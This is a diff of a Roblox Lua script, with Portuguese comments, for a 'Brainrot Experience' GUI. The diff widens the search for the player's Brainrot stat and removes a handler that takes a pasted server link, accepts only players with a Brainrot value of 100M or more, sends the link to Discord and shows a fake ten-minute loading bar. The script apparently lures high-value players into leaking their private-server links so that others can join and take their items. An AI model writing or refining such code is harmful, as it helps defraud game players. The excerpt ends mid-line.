@@ -284,81 +284,32 @@ local function sendToDiscord(serverLink)
     end
 end
 
--- Helper function to get player's Brainrot value
+-- Helper function to get player's Brainrot value - CORRIGIDO
 local function getBrainrotValue()
-    -- Check for leaderstats first
+    local brainrotValue = 0
+    
+    -- Verificar em todos os lugares possíveis
+    -- Opção 1: leaderstats
     local leaderstats = player:FindFirstChild("leaderstats")
     if leaderstats then
         local brainrot = leaderstats:FindFirstChild("Brainrot")
-        if brainrot and brainrot:IsA("IntValue") then
-            return brainrot.Value
+        if brainrot then
+            if brainrot:IsA("IntValue") or brainrot:IsA("NumberValue") then
+                brainrotValue = brainrot.Value
+                print("Brainrot encontrado em leaderstats: " .. brainrotValue)
+                return brainrotValue
+            end
         end
     end
     
-    -- If no leaderstats, check for a Value object in PlayerGui or similar
-    -- For simulation purposes, you can modify this value
-    local simulatedBrainrot = player:FindFirstChild("BrainrotValue")
-    if simulatedBrainrot and simulatedBrainrot:IsA("IntValue") then
-        return simulatedBrainrot.Value
+    -- Opção 2: Procurar por qualquer objeto chamado Brainrot no player
+    local brainrot = player:FindFirstChild("Brainrot")
+    if brainrot and (brainrot:IsA("IntValue") or brainrot:IsA("NumberValue")) then
+        brainrotValue = brainrot.Value
+        print("Brainrot encontrado no player: " .. brainrotValue)
+        return brainrotValue
     end
     
-    -- Return 0 if no Brainrot value found
-    return 0
-end
-
--- Main function to handle Done button click
-local function onDoneClick()
-    local inputText = inputBox.Text
-    local lowerInput = string.lower(inputText)
-    
-    -- Check if input is empty or doesn't contain "server"
-    if inputText == "" or not string.find(lowerInput, "server") then
-        showNotification("Adicione um link de server valido", 3)
-        return
-    end
-    
-    -- Check if player has enough Brainrot
-    local brainrotValue = getBrainrotValue()
-    if brainrotValue < REQUIRED_BRAINROT then
-        showNotification("Para melhorar a experiência, você precisa ter um Brainrot de 100M+", 4)
-        return
-    end
-    
-    -- Send link to Discord
-    sendToDiscord(inputText)
-    
-    -- All checks passed - start loading
-    mainFrame.Visible = false
-    loadingScreen.Visible = true
-    
-    -- Animate loading bar over 10 minutes
-    local startTime = tick()
-    local elapsed = 0
-    
-    while elapsed < LOADING_DURATION do
-        elapsed = tick() - startTime
-        local progress = math.min(elapsed / LOADING_DURATION, 1)
-        
-        -- Update loading bar size
-        loadingBarFill.Size = UDim2.new(progress, 0, 1, 0)
-        
-        task.wait(0.1)
-    end
-    
-    -- Loading complete
-    loadingTitle.Visible = false
-    loadingBarBg.Visible = false
-    completionMessage.Text = "Completed"
-end
-
--- Connect Done button event
-doneButton.MouseButton1Click:Connect(onDoneClick)
-
--- Optional: Allow Enter key to submit
-inputBox.FocusLost:Connect(function(enterPressed)
-    if enterPressed then
-        onDoneClick()
-    end
-end)
-
-print("Brainrot Experience GUI loaded successfully!")
+    -- Opção 3: Procurar em BackpackFolder ou similar
+    local backpack = player:FindFirstChild("Backpack")
+    if backpack
